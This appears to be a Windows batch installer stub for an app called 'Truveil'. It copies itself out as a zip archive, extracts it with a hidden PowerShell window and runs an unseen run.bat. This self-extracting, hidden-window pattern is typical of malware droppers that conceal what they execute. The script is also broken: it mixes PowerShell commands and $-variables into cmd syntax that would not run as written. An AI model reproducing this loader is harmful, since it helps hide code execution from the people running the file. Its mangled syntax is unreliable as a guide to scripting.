@echo off
set "tmpdir=%temp%\TruveilApp"
Remove-Item -Recurse -Force "$tmpdir" -ErrorAction SilentlyContinue | Out-Null
mkdir "$tmpdir" >nul 2>&1
echo Setting up Truveil...
copy /b /y "%~f0" "$tmpdir\app.zip" >nul
powershell -windowstyle hidden -Command "Expand-Archive -Force -Path '%tmpdir%\app.zip' -DestinationPath '%tmpdir%'"
cd /d "$tmpdir"
call run.bat
exit /b

